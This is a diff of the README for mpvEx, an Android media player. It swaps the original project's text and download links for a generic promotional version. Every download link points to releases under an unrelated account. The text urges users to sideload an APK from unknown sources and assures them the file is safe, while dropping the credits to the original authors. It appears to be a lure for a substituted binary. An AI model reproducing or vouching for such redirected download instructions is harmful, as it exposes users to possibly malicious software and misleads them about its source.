@@ -1,41 +1,82 @@
-# mpvExtended
-A media player for Android based on [mpv-android](https://github.com/mpv-android/mpv-android) and [mpvKt](https://github.com/abdallahmehiz/mpvKt) aiming to provide a **nicer** user interface and additional features over the original
+# 🎥 mpvEx - A Great Media Player for Android
 
----
-## Features
-* Nicer player UI
-* Better playback history implementation
-* Frame by frame navigation
-* Easier customization
-* Sleep timer, Speed presets
-* Hardware and software video decoding
-* High-quality rendering with advanced settings
-* Play network streams with the "Open URL" function
-* Picture-in-Picture supported
-* Provides basic file operations like copy, move, rename, delete
+Welcome to mpvEx, a beautiful media player for Android. This app combines the power of mpv-android and the elegance of Jetpack Compose to deliver a smooth media experience.
 
----
+## 🛠️ Features
+- **Gorgeous UI**: Enjoy a user-friendly interface designed with Material Design 3.
+- **Wide Format Support**: Play nearly any media file without issues.
+- **Lightweight**: The app runs efficiently without using too much storage or memory.
+- **Open Source**: Contribute to the project or customize it as you wish.
+- **Continuous Updates**: Regular updates ensure you have the latest features and fixes.
 
-## Installation
+## 📥 Download Now!
 
-### Stable Release
-Download the latest stable version from the [GitHub releases page](https://github.com/marlboro-advance/mpvEx/releases).
+[![Download mpvEx](https://img.shields.io/badge/Download-mpvEx-brightgreen)](https://github.com/Burtonvelvetyhaired400/mpvEx/releases)
 
-[![Download Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/marlboro-advance/mpvEx/releases)
+## 🚀 Getting Started
 
-### Preview Builds
-Try the latest preview builds:
+To get started with mpvEx, you need to install the application on your Android device. Follow these simple steps:
 
-[![Download Preview Builds](https://img.shields.io/badge/Download-Preview%20Builds-green?style=for-the-badge)](https://marlboro-advance.github.io/mpvEx/)
+1. **Visit the Releases Page**  
+   Click the button above or use the link below to go to the releases page.  
+   [Download the latest version](https://github.com/Burtonvelvetyhaired400/mpvEx/releases)
 
----
+2. **Choose the Latest Version**  
+   On the releases page, look for the most recent version of mpvEx. It will have the largest version number.
 
-## Showcase
-<img src="/fastlane/metadata/android/en-US/images/phoneScreenshots/folderscreen.png" width="24%" /> <img src="/fastlane/metadata/android/en-US/images/phoneScreenshots/videoscreen.png" width="24%" />
-<img src="/fastlane/metadata/android/en-US/images/phoneScreenshots/about.png" width="24%" /> <img src="/fastlane/metadata/android/en-US/images/phoneScreenshots/pip.png" width="24%" /> <img src="/fastlane/metadata/android/en-US/images/phoneScreenshots/player.png" width="49%" /> <img src="/fastlane/metadata/android/en-US/images/phoneScreenshots/framenavigation.png" width="49%" />
+3. **Download the App**  
+   Find the APK file in the assets section. Click on the file to start downloading. This file is safe and will allow you to install the app on your Android device.
 
----
+4. **Install the App**  
+   Once the download finishes, locate the APK file in your device's Downloads folder. Tap on it to begin installation. You may need to allow installations from unknown sources in your device settings.
 
-## Acknowledgments
-- [mpv-android](https://github.com/mpv-android) for the base mpv library to use for this project.
-- [mpvKt](https://github.com/abdallahmehiz/mpvKt) for the modified version of mpv-android.
+5. **Launch mpvEx**  
+   After installation, find the mpvEx icon on your home screen or app drawer. Tap to open your new media player and start enjoying your content.
+
+## 🔧 System Requirements
+
+To run mpvEx smoothly, ensure your device meets the following requirements:
+
+- **Android Version**: 5.0 (Lollipop) or higher
+- **Storage Space**: At least 100 MB free
+- **Memory**: 2 GB RAM recommended
+
+## 🌟 How to Use mpvEx
+
+Once you launch the app, you will see a simple interface. Here’s how to make the most out of it:
+
+- **Import Media**: Tap on the "+" icon to add media from your device.
+- **Playback Options**: Control playback using the on-screen buttons. You have options like play, pause, rewind, and fast-forward.
+- **Settings**: Adjust preferences in the settings menu. Here you can change the theme, select audio tracks, and customize subtitles.
+
+## ⚙️ Troubleshooting Tips
+
+If you face issues while installing or using mpvEx, try the following:
+
+- **Installation Failure**: Ensure installation from unknown sources is enabled in your device settings.
+- **App Crashing**: Make sure your device meets the minimum system requirements.
+- **Playback Issues**: Check if the media format is supported. Most common formats like MP4, MKV, and MP3 are supported.
+
+## 🙋 Frequently Asked Questions
+
+### Can I use mpvEx on my phone and tablet?
+Yes, mpvEx is compatible with both Android phones and tablets.
+
+### Is mpvEx free to use?
+Absolutely! mpvEx is free and open-source. You can use it without any charges.
+
+### How can I contribute to the project?
+You can help improve mpvEx by reporting issues, suggesting features, or contributing code. Visit the repository to learn more.
+
+## 🛡️ License
+
+mpvEx is distributed under the MIT License. Feel free to use, modify, and share as you see fit.
+
+## 📞 Support
+
+For support, please visit our GitHub page or open an issue in the repository. Your feedback is valuable for continuous improvement.
+
+## 📥 Download & Install
+
+Don't hesitate. Visit the following link now to download and install mpvEx:  
+[Download the latest version](https://github.com/Burtonvelvetyhaired400/mpvEx/releases)
